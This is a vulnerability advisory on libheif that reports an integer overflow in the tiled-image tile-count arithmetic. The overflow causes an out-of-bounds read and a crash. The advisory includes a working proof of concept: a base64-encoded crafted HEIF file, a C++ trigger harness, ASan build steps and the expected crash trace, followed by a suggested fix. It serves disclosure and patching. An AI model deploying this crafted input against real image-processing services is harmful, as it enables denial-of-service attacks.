# Integer overflow in tiled image geometry → crash in `heif_image_handle_get_luma_bits_per_pixel()`

**Affected versions:** libheif ≤ 1.21.2, master `f20a88baec0f34825cc076b3dfb2578fb2d5728c`  
**CWE:** CWE-190 (Integer Overflow or Wraparound), CWE-125 (Out-of-bounds Read)  
**CVSS 3.1:** 6.5 Medium (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)  
**Trigger:** `heif_image_handle_get_luma_bits_per_pixel()` on a handle loaded from a crafted HEIF file

---

## Root Cause

`nTiles_h()` and `nTiles_v()` (`tiled.cc:88,94`) compute tile counts using 32-bit arithmetic:

```cpp
// tiled.cc:88
uint32_t nTiles_h() const {
    return (image_width + tile_width - 1) / tile_width;  // overflows when image_width = 0xFFFFFFFE
}
```

For `image_width = 0xFFFFFFFE` and `tile_width = 3`, `image_width + tile_width - 1` wraps to `0`, so `nTiles_h()` returns `0`. The tile-offset vector is then resized to zero entries:

```cpp
m_offsets.resize(nTiles_h() * nTiles_v());  // resize(0) — empty vector
```

Later, `heif_image_handle_get_luma_bits_per_pixel()` reaches the tiled-image path, calls `TiledHeader::is_tile_offset_known()` (`tiled.h:118`), and dereferences `m_offsets[0]` on an empty vector — an **out-of-bounds read** (SEGV on the null internal pointer of a zero-capacity vector).


## Proof of Concept

### 1. Decode the POC file

Save the following as `decode_poc.py` and run `python3 decode_poc.py`:

```python
import base64
data = "AAAAGGZ0eXBtaWYxAAAAAG1pZjFoZWljAAAA1m1ldGEAAAAAAAAAKGhkbHIAAAAAAAAAAHBpY3QAAAAAAAAAAAAAAABQaWN0dXJlAAAAACNpaW5mAAAAAAABAAAAFWluZmUCAAAAAAEAAHRpbGkAAAAAU2lwcnAAAAA2aXBjbwAAABRpc3BlAAAAAP////4AAAAEAAAAGnRpbEMAAAAFAAAAAwAAAARodmMxAAAAAAAVaXBtYQAAAAAAAAABAAECgYIAAAAOcGl0bQAAAAAAAQAAAB5pbG9jAAAAAEQAAAEAAQAAAAEAAAD2AAAAEAAAABhtZGF0AAAAAAAAAAAAAAAAAAAAAA=="
open("poc_input", "wb").write(base64.b64decode(data))
print(f"Wrote {len(base64.b64decode(data))} bytes to poc_input")
```

The file contains a tiled image item (`tili`) with `image_width = 0xFFFFFFFE` and `tile_width = 3`. The 32-bit overflow in `nTiles_h()` produces a zero tile count, causing an empty `m_offsets` vector and a subsequent OOB access.

### 2. Build libheif with AddressSanitizer

```bash
git clone --depth=1 https://github.com/strukturag/libheif.git /tmp/libheif
cmake -S /tmp/libheif -B /tmp/lhbuild \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_INSTALL_PREFIX=/tmp/lhinstall \
    -DWITH_LIBDE265=OFF -DWITH_X265=OFF -DWITH_EXAMPLES=OFF
cmake --build /tmp/lhbuild -j$(nproc) --target install
```

### 3. Build and run the harness

Save as `poc_trigger.cc`:

```cpp
#include <cstdio>
#include <cstdlib>
#include <libheif/heif.h>

int main(int argc, char* argv[]) {
    const char* path = argc > 1 ? argv[1] : "poc_input";
    FILE* f = fopen(path, "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    unsigned char* data = (unsigned char*)malloc(sz);
    fread(data, 1, sz, f); fclose(f);

    heif_context* ctx = heif_context_alloc();
    heif_context_read_from_memory(ctx, data, sz, nullptr);

    int n = heif_context_get_number_of_top_level_images(ctx);
    heif_item_id* ids = (heif_item_id*)malloc(n * sizeof(heif_item_id));
    heif_context_get_list_of_top_level_image_IDs(ctx, ids, n);

    heif_image_handle* handle = nullptr;
    heif_context_get_image_handle(ctx, ids[0], &handle);

    // Crash happens here: reaches TiledHeader::is_tile_offset_known() with empty m_offsets
    heif_image_handle_get_luma_bits_per_pixel(handle);

    fprintf(stderr, "UNEXPECTED: no crash\n");
    heif_image_handle_release(handle);
    heif_context_free(ctx); free(ids); free(data);
}
```

```bash
clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
    poc_trigger.cc \
    -I/tmp/lhinstall/include -L/tmp/lhinstall/lib -Wl,-rpath,/tmp/lhinstall/lib \
    -lheif -o poc_trigger

ASAN_OPTIONS="detect_leaks=0:print_stacktrace=1" ./poc_trigger poc_input
```

### 4. Expected output

```
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
    #0  TiledHeader::is_tile_offset_known(unsigned int) const
            libheif/image-items/tiled.h:118
    #1  ImageItem_Tiled::append_compressed_tile_data(...)
            libheif/image-items/tiled.cc:888
    #2  ImageItem_Tiled::get_luma_bits_per_pixel() const
            libheif/image-items/tiled.cc:1014
    #3  heif_image_handle_get_luma_bits_per_pixel
            libheif/api/libheif/heif.cc
    #4  main  poc_trigger.cc
```

The SEGV address `0x000000000000` is the null internal pointer of an empty `std::vector` — not a caller-supplied null. The root cause is integer overflow in the file parser corrupting the tile geometry.


## Suggested Fix

Perform the tile-count arithmetic in a wider type and reject overflow before resizing `m_offsets`:

```cpp
// tiled.cc — nTiles_h() / nTiles_v()
uint32_t nTiles_h() const {
    uint64_t result = ((uint64_t)image_width + tile_width - 1) / tile_width;
    if (result == 0 || result > UINT32_MAX) {
        // signal error — caller must handle
    }
    return (uint32_t)result;
}
```

Also add a guard before `m_offsets.resize(...)` that returns an error when the computed tile count is zero or would overflow `size_t`.
